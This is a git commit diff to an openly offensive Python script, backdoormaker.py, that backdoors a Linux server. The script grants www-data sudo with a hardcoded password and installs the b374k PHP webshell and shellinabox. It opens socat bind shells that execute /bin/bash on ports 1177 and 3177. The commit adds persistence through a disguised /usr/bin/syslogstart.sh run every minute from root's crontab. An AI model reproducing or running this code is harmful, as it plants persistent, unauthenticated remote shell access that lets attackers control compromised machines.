655f66a6ee2c009fddeed4da0e7201487a65fc40
Shad0wGhost <9370866+shad0wghost@users.noreply.github.com>
2019-01-20 16:37:11 -0800

    Add files via upload

--- backdoormaker.py
+++ backdoormaker.py
@@ -13,6 +13,7 @@ if apacheTrue is True:
     os.system("adduser www-data sudo")
     os.system('echo www-data:Lolsecure2018! | chpasswd')
     os.system("git clone https://github.com/b374k/b374k /var/www/html/shell")
+    os.system("service apache2 restart")
 
 else:
     print "Installing Apache backdoor (Giving tools:shellinabox and phpwebshell) "
@@ -21,19 +22,32 @@ else:
     os.system("adduser www-data sudo")
     os.system('echo www-data:Lolsecure2018! | chpasswd')
     os.system("git clone https://github.com/b374k/b374k /var/www/html/shell")
+    os.system("service apache2 restart")
+
 
 
 #install Shell in a shellinabox
 #access http://IP:4200
 os.system("apt-get install shellinabox")
 
-#Socat SCTP backdoor
+#local priv esec vector Socat SCTP backdoor
 #connect with socat STDIO SCTP:IP:1177
 os.system("apt-get install socat")
 os.system("socat SCTP-Listen:1177,fork EXEC:/bin/sh &")
 
-#Socat Tcp backdoor
+#Socat Tcp backdoor over edge
 #connect with socat STDIO TCP4:IP:3177
 os.system("socat TCP4-Listen:3177,fork EXEC:/bin/bash &")
 
 #socat backdoor persistance
+f = open("/usr/bin/syslogstart.sh", "w")
+f.write("""if lsof -Pi :3177 -sTCP:LISTEN -t >/dev/null ; then
+        echo "" > /dev/null
+else
+        echo "" > /dev/null
+        socat TCP4-Listen:3177,fork EXEC:/bin/bash &
+fi
+""")
+f.close()
+os.system("chmod 777 /usr/bin/syslogstart.sh")
+os.system('echo "* * * * * root bash /usr/bin/syslogstart.sh" >> /etc/crontab')
